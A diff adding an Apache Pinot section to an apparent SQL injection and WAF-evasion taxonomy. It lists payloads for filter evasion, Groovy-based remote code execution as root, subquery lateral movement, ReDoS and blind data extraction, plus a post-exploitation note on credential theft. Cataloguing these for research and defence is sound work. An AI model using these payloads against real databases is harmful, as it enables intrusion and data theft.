@@ -219,6 +219,20 @@ Mutations leveraging **proprietary functions, syntax, and system objects** uniqu
 |---------|-----------|-----------------|
 | **BigQuery Dialect Injection** | Google BigQuery uses non-standard SQL syntax (backtick-quoted identifiers, `SAFE_DIVIDE()`, `FORMAT()`, `UNNEST()`) that standard WAF rulesets tuned for MySQL/PostgreSQL/MSSQL fail to detect | `` SELECT * FROM `project.dataset.table` WHERE SAFE_DIVIDE(1,(SELECT IF(condition,1,0)))=1 `` |
 
+### §3-7. Real-Time Analytics Database-Specific Techniques (Apache Pinot)
+
+Apache Pinot is a real-time distributed OLAP datastore using Apache Calcite-based SQL (many Calcite features unsupported). Its unique injection surface stems from built-in Groovy script execution enabled by default in all released versions through 0.10.0.
+
+| Subtype | Mechanism | Payload Example |
+|---------|-----------|-----------------|
+| **OPTION() filter evasion** | Pinot silently processes `OPTION(key=value)` embedded anywhere in a query, including inside string literals. Queries for `thingumajig` and `thinguOPTION(a=b)majig` return identical results — bypassing input validation and WAFs | `WHERE col LIKE '%oPtIoN(a=b)%'` |
+| **GROOVY() RCE** | `GROOVY('{"returnType":"INT","isSingleValue":true}', 'code', col)` executes arbitrary Groovy (JVM) code on the Server component as root. Java methods including `Runtime.exec()` are available | `GROOVY('{"returnType":"INT","isSingleValue":true}', '"whoami".execute().text; return 1', studentID)` |
+| **IN_SUBQUERY lateral movement** | `IN_SUBQUERY(col, 'SELECT ID_SET(col) FROM otherTable WHERE GROOVY(...)=3')` executes subqueries on different tables/Servers, enabling cross-server lateral movement within the Pinot cluster without modifying the primary injection point | `WHERE IN_SUBQUERY('x', 'SELECT ID_SET(firstName) FROM tableB WHERE groovy(...) = 3') = true` |
+| **REGEXP_LIKE ReDoS** | Java regex via `REGEXP_LIKE` enables ReDoS with catastrophic backtracking patterns | `REGEXP_LIKE(col, '((((((.*)*)*)*)*)*)*zz')` |
+| **Blind extraction via CASE + SUBSTR** | `SUBSTR(col, start, end)` (0-indexed), `LENGTH()`, `CASE` expressions, and `toUtf8()` for hash functions enable data exfiltration through conditional responses | `CASE WHEN SUBSTR(secret,0,1)='a' THEN col ELSE col-1 END` |
+
+**Post-exploitation:** Root shell on Server enables Zookeeper manipulation, unauthenticated GRPC queries to other Servers, Controller API abuse, and cloud credential extraction from environment variables (Doyensec, 2022).
+
 ---
 
 ## §4. Input Vector & Delivery Path
